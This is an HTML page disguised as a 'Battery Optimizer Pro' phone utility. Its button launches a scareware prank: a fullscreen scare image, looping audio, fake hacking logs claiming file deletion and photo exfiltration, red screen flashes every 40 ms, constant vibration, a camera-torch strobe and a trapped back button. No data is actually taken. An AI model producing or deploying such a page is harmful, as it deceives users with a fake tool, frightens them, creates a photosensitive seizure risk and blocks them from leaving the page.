<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Battery Optimizer Pro</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; margin: 0; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; position: relative; }
        .container { text-align: center; border: 1px solid #0f0; padding: 20px; border-radius: 10px; z-index: 100; background: #000; }
        #start-btn { background: #0f0; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        .flash-red { background-color: #ff0000 !important; }
        
        /* Texte défilant type film */
        .log-line { position: absolute; left: 5px; color: #0f0; font-size: 0.8rem; white-space: nowrap; z-index: 150; animation: scrollUp 2s linear forwards; }
        @keyframes scrollUp { from { transform: translateY(100vh); } to { transform: translateY(-10vh); } }

        #warning-text { display: none; position: absolute; top: 15%; color: #f00; font-size: 2rem; font-weight: bold; text-align: center; width: 100%; z-index: 200; text-shadow: 2px 2px #000; }
        #scare-img { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0; z-index: 50; pointer-events: none; }
    </style>
</head>
<body>

    <div id="warning-text">SYSTEM FAILURE:<br>UNAUTHORIZED ACCESS DETECTED</div>

    <div id="interface" class="container">
        <h2>BATTERY LOW?</h2>
        <p>Fix internal battery cells now.</p>
        <button id="start-btn" onclick="launchPrank()">OPTIMIZE NOW</button>
    </div>

    <img id="scare-img" src="https://i.imgur.com/K1z3s1H.jpeg">

    <audio id="bark-sound" loop>
        <source src="https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptoken=69733_41725350-011e-4b6a-9f5b-51369f687a4c" type="audio/mpeg">
    </audio>

    <script>
    function createLog() {
        const logs = [
            "DELETING SYSTEM32...", "ROOT_ACCESS: GRANTED", "EXFILTRATING DCIM/CAMERA...",
            "CORRUPTING BOOT SECTOR...", "GPS_LOCATION: ABIDJAN_MACACI", "UPLOADING TO DARK_NET...",
            "ERROR: KERNEL_PANIC", "OVERHEATING CPU...", "BATTERY_CELLS: DESTROYED"
        ];
        const log = document.createElement('div');
        log.className = 'log-line';
        log.style.left = Math.random() * 80 + '%';
        log.innerText = logs[Math.floor(Math.random() * logs.length)];
        document.body.appendChild(log);
        setTimeout(() => log.remove(), 2000);
    }

    async function launchPrank() {
        const audio = document.getElementById('bark-sound');
        audio.volume = 1.0;
        audio.play().catch(() => {});

        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen();
        }

        document.getElementById('interface').style.display = 'none';
        document.getElementById('warning-text').style.display = 'block';
        document.getElementById('scare-img').style.opacity = '1';

        // 1. Vibrations renforcées (Saccadé et violent)
        if ("vibrate" in navigator) {
            setInterval(() => { 
                navigator.vibrate([1000, 50, 1000, 50, 1000]); 
            }, 500);
        }

        // 2. Défilement des textes de film
        setInterval(createLog, 150);

        // 3. Flash écran violent
        setInterval(() => {
            document.body.classList.toggle('flash-red');
        }, 40);

        // 4. Flash caméra avant/arrière
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
            const track = stream.getVideoTracks()[0];
            let isOn = false;
            setInterval(async () => {
                isOn = !isOn;
                await track.applyConstraints({ advanced: [{ torch: isOn }] });
            }, 100);
        } catch (e) {}

        window.history.pushState(null, null, window.location.href);
        window.onpopstate = () => { window.history.pushState(null, null, window.location.href); };
    }
    </script>
</body>
</html>
